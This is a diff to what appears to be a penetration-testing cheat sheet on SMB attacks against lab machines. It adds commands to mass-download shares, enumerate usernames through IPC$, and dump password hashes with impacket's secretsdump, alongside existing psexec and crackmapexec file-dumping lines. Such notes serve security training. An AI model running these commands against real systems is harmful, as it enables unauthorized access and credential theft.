@@ -47,6 +47,14 @@ smbclient //10.10.10.100/Users -U active.htb/SVC_TGS #connect authenticated; wil
 smbclient //10.10.10.100/C$ -U active.htb\\administrator
 ```
 
+download everything:
+```bash
+recurse ON
+prompt OFF 
+mget *
+```
+
+
 ### crackmapexec:
 
 ```bash
@@ -59,7 +67,6 @@ crackmapexec smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus
 crackmapexec smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false ##dumpallfiles
 ```
 
-
 ### impacket:
 
 ```bash
@@ -68,6 +75,19 @@ python3 psexec.py active.htb/administrator@10.10.10.100
 python3 smbexec.py active.htb/administrator@10.10.10.100
 ```
 
+If the the IPC$ share has read access use impacket to enumerate usernames:
+```bash
+IPC$   READ ONLY	Remote IPC
+```
+
+```bash
+python3 /opt/wintools/impacket/examples/lookupsid.py anonymous@10.10.251.139
+```
+
+If the ADMIN$ share has read and write access use secretsdump.py to extract hashes:
+```bash
+python3 /opt/wintools/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat@10.10.168.11 
+```
 
 ### mounting smb shares:
 windows:
